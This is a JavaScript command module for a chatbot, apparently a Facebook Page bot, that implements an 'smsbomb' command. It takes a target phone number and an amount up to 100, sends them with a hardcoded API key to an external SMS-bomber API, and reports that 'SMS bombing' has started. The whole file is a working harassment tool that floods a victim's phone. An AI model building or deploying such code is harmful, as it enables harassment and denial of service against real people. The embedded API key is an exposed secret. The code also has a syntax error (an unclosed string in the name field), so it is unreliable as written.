const axios = require('axios');
const { sendMessage } = require('../handles/sendMessage');

module.exports = {
    name: ['smsbomb],
    usage: 'smsbomber [phone] | [amount]',
    version: '1.0.0',
    author: 'AutoPageBot',
    category: 'tools',
    cooldown: 5,

    async execute(senderId, args, pageAccessToken) {
        // Check if phone number and amount are provided
        if (args.length < 2) {
            await sendMessage(senderId, { text: '❌ Usage: smsbomber [phone] | [amount]\nExample: smsbomber 09979939317 | 5' }, pageAccessToken);
            return;
        }

        // Parse args with | separator
        let phone, amount;
        const separatorIndex = args.findIndex(arg => arg === '|');
        
        if (separatorIndex !== -1) {
            phone = args.slice(0, separatorIndex).join(' ');
            amount = parseInt(args[separatorIndex + 1]);
        } else {
            // Fallback to traditional format
            phone = args[0];
            amount = parseInt(args[1]);
        }

        const apiKey = '79d08d76a3deae3fae1c7637141db818ec02faf1e3597e302c4ed9e1d5211d89';

        // Validate amount
        if (isNaN(amount) || amount < 1 || amount > 100) {
            await sendMessage(senderId, { text: '❌ Amount must be between 1 and 100' }, pageAccessToken);
            return;
        }

        try {
            const response = await axios.get('https://haji-mix-api.gleeze.com/api/smsbomber', {
                params: {
                    phone: phone,
                    amount: amount,
                    api_key: apiKey
                }
            });

            if (response.data.success) {
                const message = `✅ ${response.data.message}\n\n📱 Target: ${phone} | 🔢 Amount: ${amount}\n💬 Status: SMS bombing initiated successfully!`;
                await sendMessage(senderId, { text: message }, pageAccessToken);
            } else {
                await sendMessage(senderId, { text: '❌ Failed to start SMS bombing. Please try again later.' }, pageAccessToken);
            }
        } catch (error) {
            console.error('SMS Bomber Error:', error);
            await sendMessage(senderId, { text: '❌ An error occurred while trying to start SMS bombing. Please check the phone number and try again.' }, pageAccessToken);
        }
    }
};